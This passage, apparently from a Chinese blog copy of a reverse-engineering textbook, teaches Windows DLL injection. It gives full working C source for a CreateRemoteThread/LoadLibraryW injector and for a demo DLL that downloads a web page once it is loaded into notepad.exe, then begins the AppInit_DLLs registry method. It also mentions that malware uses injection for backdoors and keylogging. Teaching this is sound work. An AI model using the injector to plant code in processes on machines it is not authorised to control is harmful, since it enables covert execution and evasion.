其他应用程序</h2><p>DLL注入技术也应用于监视、管理PC用户的应用程序。比如，用来阻止特定程序（像游戏、股票交易等）运行、禁止访问有害网站，以及监视PC的使用等。管理员（或者父母）主要安装这类拦截&#x2F;阻断应用程序来管理&#x2F;监视。受管理&#x2F;监视的一方当然千方百计地想关闭这些监视程序，但由于这些监视程序采用DLL注入技术，它们可以隐藏在正常进程中运行，所以管理员一般不用担心被发现或被终止（若用户强制终止Windows系统进程，也会一并关闭系统，最后也算达成了拦截&#x2F;阻断这一目标）。</p><h2 id="23-2-5-恶意代码"><a href="#23-2-5-恶意代码" class="headerlink" title="23.2.5 恶意代码"></a>23.2.5 恶意代码</h2><p>恶意代码制作者们是不会置这么好的技术于不顾的，他们积极地把DLL注入技术运用到自己制作的恶意代码中。这些入把自己编写的恶意代码隐藏到正常进程（winlogon.exe、services.exe、svchost.exe、explorer.exe等），打开后门端口（ Backdoor port ），尝试从外部连接，或通过键盘偷录（Keylogging）功能将用户的个入信息盗走。只有了解恶意代码制作者们使用的手法，才能拿出相应对策</p><h1 id="23-3-DLL注入的实现方法"><a href="#23-3-DLL注入的实现方法" class="headerlink" title="23.3 DLL注入的实现方法"></a>23.3 DLL注入的实现方法</h1><p>向某个进程注入DLL时主要使用以下三种方法：</p><p>DLL注入方法</p><p>□创建远程线程（CreateRemoteThread() API） </p><p>□使用注册表（AppInit_DLLs值） </p><p>□消息钩取（SetWindowsHookEx() API）</p><h1 id="23-4-CreateRemoteThread"><a href="#23-4-CreateRemoteThread" class="headerlink" title="23.4 CreateRemoteThread()"></a>23.4 CreateRemoteThread()</h1><p>本方法是《Windows核心编程》一书（素有“Windows编程圣经”之称）中介绍过的。本节 通过一个简单的示例来演示如何通过创建远程线程完成DLL注入。</p><h2 id="23-4-1-练习示例-myhack-dll"><a href="#23-4-1-练习示例-myhack-dll" class="headerlink" title="23.4.1 练习示例 myhack.dll"></a>23.4.1 练习示例 myhack.dll</h2><p>本示例将把myhack.dll注入notepad.exe进程，被注入的myhack.dll是用来联网并下载<a href="http://www.naver.com/index.html%E6%96%87%E4%BB%B6%E7%9A%84%E3%80%82">http://www.naver.com/index.html文件的。</a></p><p><strong>复制练习文件</strong></p><p>首先将练习文件（InjectDll.exe、myhack.dll）分别复制到工作文件夹。</p><p><strong>运行notepad.exe程序</strong></p><p>先运行notepad.exe （日记本）程序，再运行Process Explorer （或者Windows任务管理器）获 取notepad.exe进程的PID。</p><p>可以看到图23-3中notepad.exe进程的PID值为1016。</p><p><strong>运行DebugView</strong></p><p>DebugView是一个非常有用的实用程序，它可以用来捕获并显示系统中运行的进程输出的所有调试字符串，由大名鼎鼎的Process Explorer制作入Mark Russinovich开发而成。请访问下面URL下载。</p><p><a href="http://technet.microsoft.com/en-us/sysintemals/bb896647">http://technet.microsoft.com/en-us/sysintemals/bb896647</a></p><p>示例中的DLL文件被成功注入notepad.exe进程时，就会输出调试字符串，此时使用DebugView<br>即可查看，如图23-4所示。</p><blockquote><p>应当养成在应用程序开发中灵活使用DebugView查看调试日志的好习惯。</p></blockquote><p><strong>myhack.dll注入</strong><br>InjectDll.exe是用来向目标进程注入DLL文件的实用小程序（后面会详细讲解工作原理及源代码）。如图23-5所示，打开命令窗口并输入相应参数即可运行InjectDll.exe。</p><p><strong>确认DLL注入成功</strong><br>下面要检查myhack.dll文件是否成功注入notepad.exe进程。首先查看DebugView日志，如图23-6所示。</p><p>DebugView中显示岀调试字符串，该字符串是由HD:1016进程输岀的。PID:1016进程就是注入myhack.dll的notepad.exe进程。成功注入myhack.dll时，就会调用执行DllMain()函数的OutputDebugString() API。 </p><p>在Process Explorer中也可以看到myhack.dll已经成功注入notepad.exe进程。在Process Explorer的View菜单中，选择Show Lower Pane与Lower Pane Views - DLLs项，然后选择notepad.exe进程，就会列出所有加载到notepad.exe进程中的dll,如图23-7所示。在图中可以看到已经成功注入notepad.exe的myhack.dll文件。</p><p><strong>结果确认</strong><br>下面确认一下指定网站的index.html文件下载是否正常。</p><p>双击图23-8中的Index.html文件，在IE浏览器中查看页面。</p><p>图23-9看上去虽然与实际网站的主页面有些不同，但可以肯定它就是该网站的index.html文件。</p><blockquote><p>有时会因系统用户权限、安全设置等导致无法下载index.html文件。</p></blockquote><p>就像在上述示例中看到的一样，借助创建远程线程的方法可以成功“渗透”指定进程，进而可以随意操作。下面继续分析示例源代码，进一步学习使用CreateRemoteThread() API实施DLL注入的原理与实现方法。</p><h2 id="23-4-2-分析示例源代码"><a href="#23-4-2-分析示例源代码" class="headerlink" title="23.4.2 分析示例源代码"></a>23.4.2 分析示例源代码</h2><blockquote><p>以下介绍的源代码是用Micosoft Visual C++ Express 2010编写的，在Windows XP&#x2F;732位操作系统中通过测试。</p></blockquote><p>Myhack.cpp<br>先分析一下myhack.dll源代码（myhack.cpp ）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;urlmon.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_URL     (<span class="hljs-string">L&quot;http://www.naver.com/index.html&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_FILE_NAME   (<span class="hljs-string">L&quot;index.html&quot;</span>)</span><br><br>HMODULE g_hMod = <span class="hljs-literal">NULL</span>;<br><br>DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span><br>&#123;<br>    TCHAR szPath[_MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br><br>    <span class="hljs-keyword">if</span>( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    TCHAR *p = _tcsrchr( szPath, <span class="hljs-string">&#x27;\\&#x27;</span> );<br>    <span class="hljs-keyword">if</span>( !p )<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    _tcscpy_s(p+<span class="hljs-number">1</span>, _MAX_PATH, DEF_FILE_NAME);<br><br>    URLDownloadToFile(<span class="hljs-literal">NULL</span>, DEF_URL, szPath, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span><br>&#123;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><br>    g_hMod = (HMODULE)hinstDLL;<br><br>    <span class="hljs-keyword">switch</span>( fdwReason )<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH : <br>        OutputDebugString(<span class="hljs-string">L&quot;&lt;myhack.dll&gt; Injection!!!&quot;</span>);<br>        hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>        CloseHandle(hThread);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>在DllMain()函数中可以看到，该DLL被加载（DLL_PROCESS_ATTACH）时，先输出一个调试字符串（“myhack.dll Injection!!!”），然后创建线程调用函数（ThreadProc）。在ThreadProc()函数中通过调用urlmon!URLDownloadToFile() API来下载指定网站的index.html文件。前面提到过，向进程注入DLL后就会调用执行该DLL的DllMain()函数。所以当myhack.dll注入notepad.exe进程后，最终会调用执行URLDownloadToFile()API。</p><p><strong>InjectDII.cpp</strong></p><p>InjectDll.exe程序用来将myhack.dll注入notepad.exe进程，下面看一下其源代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br>BOOL <span class="hljs-title function_">SetPrivilege</span><span class="hljs-params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> <br>&#123;<br>    TOKEN_PRIVILEGES tp;<br>    HANDLE hToken;<br>    LUID luid;<br><br>    <span class="hljs-keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),<br>                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, <br>              &amp;hToken) )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !LookupPrivilegeValue(<span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// lookup privilege on local system</span><br>                              lpszPrivilege,  <span class="hljs-comment">// privilege to lookup </span><br>                              &amp;luid) )        <span class="hljs-comment">// receives LUID of privilege</span><br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); <br>        <span class="hljs-keyword">return</span> FALSE; <br>    &#125;<br><br>    tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>    tp.Privileges[<span class="hljs-number">0</span>].Luid = luid;<br>    <span class="hljs-keyword">if</span>( bEnablePrivilege )<br>        tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>    <span class="hljs-keyword">else</span><br>        tp.Privileges[<span class="hljs-number">0</span>].Attributes = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Enable the privilege or disable all privileges.</span><br>    <span class="hljs-keyword">if</span>( !AdjustTokenPrivileges(hToken, <br>                               FALSE, <br>                               &amp;tp, <br>                               <span class="hljs-keyword">sizeof</span>(TOKEN_PRIVILEGES), <br>                               (PTOKEN_PRIVILEGES) <span class="hljs-literal">NULL</span>, <br>                               (PDWORD) <span class="hljs-literal">NULL</span>) )<br>    &#123; <br>        _tprintf(<span class="hljs-string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); <br>        <span class="hljs-keyword">return</span> FALSE; <br>    &#125; <br><br>    <span class="hljs-keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;The token does not have the specified privilege. \n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125; <br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>BOOL <span class="hljs-title function_">InjectDll</span><span class="hljs-params">(DWORD dwPID, LPCTSTR szDllPath)</span><br>&#123;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>, hThread = <span class="hljs-literal">NULL</span>;<br>    HMODULE hMod = <span class="hljs-literal">NULL</span>;<br>    LPVOID pRemoteBuf = <span class="hljs-literal">NULL</span>;<br>    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="hljs-number">1</span>) * <span class="hljs-keyword">sizeof</span>(TCHAR);<br>    LPTHREAD_START_ROUTINE pThreadProc;<br><br>    <span class="hljs-comment">// #1. dwPID 를 이용하여 대상 프로세스(notepad.exe)의 HANDLE을 구한다.</span><br>    <span class="hljs-keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// #2. 대상 프로세스(notepad.exe) 메모리에 szDllName 크기만큼 메모리를 할당한다.</span><br>    pRemoteBuf = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<br><br>    <span class="hljs-comment">// #3. 할당 받은 메모리에 myhack.dll 경로(&quot;c:\\myhack.dll&quot;)를 쓴다.</span><br>    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// #4. LoadLibraryA() API 주소를 구한다.</span><br>    hMod = GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);<br>    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>    <span class="hljs-comment">// #5. notepad.exe 프로세스에 스레드를 실행</span><br>    hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pThreadProc, pRemoteBuf, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    WaitForSingleObject(hThread, INFINITE);<br><br>    CloseHandle(hThread);<br>    CloseHandle(hProcess);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR *argv[])<br>&#123;<br>    <span class="hljs-keyword">if</span>( argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// change privilege</span><br>    <span class="hljs-keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// inject dll</span><br>    <span class="hljs-keyword">if</span>( InjectDll((DWORD)_tstol(argv[<span class="hljs-number">1</span>]), argv[<span class="hljs-number">2</span>]) )<br>        _tprintf(<span class="hljs-string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">else</span><br>        _tprintf(<span class="hljs-string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>main()函数的主要功能是检查输入程序的参数，然后调用InjectDll()函数。InjectDll()函数是用 来实施DLL注入的核心函数，其功能是命令目标进程（notepadexe ）自行调用LoadLibrary（“myhack.dll”）API。下面逐行详细查看InjectDll()函数。</p><ul><li>获取目标进程句柄</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)<br></code></pre></td></tr></table></figure><p>调用OpenProcessO API,借助程序运行时以参数形式传递过来的dwPID值，获取notepad.exe进程的句柄（PROCESS_ALL_ACCESS权限）。得到PROCESS_ALL_ACCESS权限后，就可以使用获取的句柄（hProcess ）控制对应进程（notepad.exe ）0</p><ul><li>将要注入的DLL路径写入目标进程内存</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pRemoteBuf = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwBufSize, MEMCOMMIT, PAGEREADWRITE);<br></code></pre></td></tr></table></figure><p>需要把即将加载的DLL文件的路径（字符串）告知目标进程（notepacLexe ）。因为任何内存空间都无法进行写入操作，故先使用VirtualAllocEx() API在目标进程（notepad.exe）的内存空间中分配一块缓冲区，且指定该缓冲区的大小为DLL文件路径字符串的长度（含Terminating NULL ）即可。</p><blockquote><p>VirtualAllocEx()函数的返回值（pRemoteBuf）为分配所得缓冲区的地址。该地址并不是程序（Inject.exe ）自身进程的内存地址，而是hProcess句柄所指目标进程（notepad.exe）的内存地址，请务必牢记这一点。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID) szDUName, dwBufSize, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>使用WriteProcessMemory() API将DLL路径字符串（“C:\work\dummy.dll”）写入分配所得缓冲区（pRemoteBuf）地址。WriteProcessMemoryO API所写的内存空间也是hProcess句柄所指的目标进程（notepad.exe ）的内存空间。这样，要注入的DLL文件的路径就被写入目标进程（notepad.exe ）的内存空间。</p><blockquote><p>Windows操作系统提供了调试API,借助它们可以访问其他进程的内存空间。其中具有代表性的有 VirtualAllocEx()、VirtualFreeEx()、WriteProcessMemory()、ReadProcessMemory()等。</p></blockquote><ul><li>获取LoadLibraryW() API地址</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">hMod = GetModuleHandle(<span class="hljs-string">&quot;kernel32 .dll&quot;</span>);<br>pThreadProc = (LPTHREAD_STARTROUTINE)GetProcAddress(hMod, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br></code></pre></td></tr></table></figure><p>调用LoadLibrary() API前先要获取其地址（LoadLibraryW()是LoadLibrary()的Unicode字符串版本）。</p><p>最重要的是理解好以上代码的含义。我们的目标明明是获取加载到notepaclexe进程的kernel32.dll的LoadLibraryW() API的起始地址，但上面的代码却用来获取加载到InjectDll.exe进程的kernel32.dll的LoadLibraryW() API的起始地址。如果加载到notepad.exe进程中的kemel32.dll的地址与加载到InjectDll.exe进程中的kemel32.dll的地址相同，那么上面的代码就不会有什么问题。但 是如果kemel32.dll在每个进程中加载的地址都不同，那么上面的代码就错了，执行时会发生内存引用错误。</p><p><strong>其实在Windows系统中，kernel32.dll在每个进程中的加载地址都是相同的。</strong></p><p>《Windows核心编程》一书中对此进行了介绍，此后这一特性被广泛应用于DLL注入技术。</p><blockquote><p>根据OS类型、语言、版本不同，kernel32.dll加载的地址也不同。并且Vista&#x2F;7中应用了新的ASLR功能，每次启动时，系统DLL加载的地址都会改变。但是在系统运行期间它都会被映射（Mapping）到每个进程的相同地址。Windows操作系统中，<strong>DLL首次进入内存称为“加载”</strong>（Loading），以后其他进程需要使用相同DLL时不必再次加载，只要将加载过的DLL代码与资源<strong>映射</strong>一下即可，这种映射技术有利于提高内存的使用效率。</p></blockquote><p>像上面这样，OS核心DLL会被加载到自身固有的地址，DLL注入利用的就是Windows OS的这一特性（该特性也可能会被恶意使用，成为Windows安全漏洞）。所以，导入InjectDll.exe进程中的LoadLibraryW()地址与导入notepad.exe进程中的LoadLibraryW()地址是相同的。</p><blockquote><p>一般而言，DLL文件的ImageBase默认为0x10000000，依次加载a.dll与b.dll时，先加载的a.dll被正常加载到0x10000000地址处，后加载的b.dll无法再被加载到此，而是加载到其他空白地址空间，也就是说，该过程中发生了 DLL重定位（因为a.dll已经先被加载到它默认的地址处）。 </p><p>若kemel32.dll加载到各个进程时地址各不相同，那么上述代码肯定是错误的。但实际在Windows操作系统中，kemel32.dll不管在哪个进程都会被加载至相同地址。为什么会这样呢？我借助PEView软件查看了 Windows操作系统的核心DLL文件的 ImageBase值，罗列如下表（Windows XP SP3版本，根据Windows更新不同，各值会有变化）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5.assets/image-20220221194000215.png" alt="image-20220221194000215"></p><p>微软整理了一份OS核心DLL文件的ImageBase值，防止各DLL文件加载时出现区域重合，这样加载DLL就不会发生DLL重定位了。</p></blockquote><ul><li>在目标进程中运行远程线程（Remote Thread）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pThreadProc, pRemoteBuf, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>pThreadProc = notepad.exe进程内存中的LoadLibrary()地址<br>pRemoteBuf = notepad.exe进程内存中的 “c:\work\myhack.dll” 字符串地址<br></code></pre></td></tr></table></figure><p>一切准备就绪后，最后向notepad.exe发送一个命令，让其调用LoadLibraryW() API函数加载指定的DLL文件即可，遗憾的是Windows并未直接提供执行这一命令的API。但是我们可以另辟蹊径，使用CreateRemoteThread()这个API （在DLL注入时几乎总会用到）。CreateRemoteThread()API用来在目标进程中执行其创建出的线程，其函数原型如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">CreateRemoteThread(<br>    _In_ HANDLE hProcess,<br>    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,<br>    _In_ SIZE_T dwStackSize,<br>    _In_ LPTHREAD_START_ROUTINE lpStartAddress,<br>    _In_opt_ LPVOID lpParameter,<br>    _In_ DWORD dwCreationFlags,<br>    _Out_opt_ LPDWORD lpThreadId<br>    );<br></code></pre></td></tr></table></figure><p>除第一个参数hProcess外，其他参数与CreateThread()函数完全一样。hProcess参数是要执行线程的目标进程（或称“远程进程”、“宿主进程”）的句柄。IpStartAddress与IpParameter参数分别给出线程函数地址与线程参数地址。需要注意的是，这2个地址都应该在目标进程虚拟内存空间中（这样目标进程才能认识它们）。</p><p>初次接触DLL注入技术的读者朋友可能会头昏脑涨、不知所云。本来想向其他进程注入DLL文件，这里为何突然出现线程运行函数呢？仔细观察线程函数ThreadProc()与LoadLibrary()API，可以从中得到一些启示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 这里直接搬运了PTHREAD_START_ROUTINE的定义更为准确</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">DWORD</span> <span class="hljs-params">(WINAPI *PTHREAD_START_ROUTINE)</span><span class="hljs-params">(</span><br><span class="hljs-params">    LPVOID lpThreadParameter</span><br><span class="hljs-params">    )</span>;<br><span class="hljs-keyword">typedef</span> PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;<br><br><br>HINSTANCE <span class="hljs-title function_">LoadLibrary</span><span class="hljs-params">(</span><br><span class="hljs-params">LPCTSTR lpLibFileName</span><br><span class="hljs-params"> <span class="hljs-comment">// address of filename of executable module</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>两函数都有一个4字节的参数，并返回一个4字节的值。也就是说，二者形态结构完全一样，灵感即源于此。调用CreateRemoteThread()时，只要将LoadLibrary()函数的地址传递给第四个参数IpStartAddress,把要注入的DLL的路径字符串地址传递给第五个参数IpParameter即可（必须是目标进程的虚拟内存空间中的地址）。由于前面已经做好了一切准备，现在调用该函数使目标进程加载指定的DLL文件就行了。</p><p>其实，CreateRemoteThread()函数最主要的功能就是驱使目标进程调用LoadLibrary()函数，进而加载指定的DLL文件。</p><h2 id="23-4-3-调试方法"><a href="#23-4-3-调试方法" class="headerlink" title="23.4.3 调试方法"></a>23.4.3 调试方法</h2><p>本节将介绍如何从DLL文件注入目标进程就开始调试。首先重新运行notepad.exe，然后使用Ollydbg2的Attach命令附加新生成的notepad.exe进程（使用最新版本的Ollydbg2进行DLL注入调试更方便）。</p><p>使用调试器中的Attach命令附加运行中的进程后，进程就会暂停运行。按F9 让notepad.exe运行起来。然后如图23-11所示，在Option对话框的Events中复选“Pause on new module（DLL）” 一项。这样一来，每当有新的DLL被加载到notepadexe进程，都会在该DLL的EP处暂停。同样，进行DLL注入时也会在该DLL的EP处暂停使用InjectDll.exe将myhack.dll文件注入notepad.exe进程，此时调试器将暂停。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5.assets/image-20220221195229539.png" alt="图23-11 Pause on new module（DLL）"></p><p>调试器暂停的地方并不是myhack.dll的EP，而是一个名为MSASNl.dll模块的EP。加载myhack.dll前，需要先加载它导入的所有DLL文件，MSASNl.dll文件即在该过程中被加载。011yDbg2的Pause on new module（DLL）被选中时，每当加载新的dll文件，都暂停在相应DLL文件的EP处。不断按（F9）运行键，直到在myhack.dll的EP处暂停。 </p><blockquote><p>调试前，请先取消对Pause on new module（DLL）项的复选，恢复之前“未选中”状态。</p></blockquote><blockquote><p>根据用户的系统环境，加载的DLL类型与个数可能有所不同。</p></blockquote><p>至此，对于使用CreateRemoteThread()函数进行DLL注入技术的讲解就完成了。初学时可能不怎么理解，反复认真阅读前面的讲解，实际动手操作，就较容易掌握</p><blockquote><p>使用CreateRemoteThread()函数注入相应DLL后，如何再次卸载注入的DLL,这部分内容请参考第24章。</p></blockquote><h1 id="23-5-Applnit-DLLs"><a href="#23-5-Applnit-DLLs" class="headerlink" title="23.5 Applnit_DLLs"></a>23.5 Applnit_DLLs</h1><p>进行DLL注入的第二种方法是使用注册表。Windows操作系统的注册表中默认提供了AppInt_DLLs与LoadAppInit_DLLs两个注册表项，如图23-14所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5.assets/image-20220221195754400.png" alt="image-20220221195754400"></p><p>在注册表编辑器中，将要注入的DLL的路径字符串写入AppInit_DLLs项目，然后把LoadApp!nit_DLLs的项目值设置为1。重启后，指定DLL会注入所有运行进程。该方法操作非常简单，但功能相当强大。</p><blockquote><p>上述方法的工作原理是，User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若有值，则调用LoadLibrary() 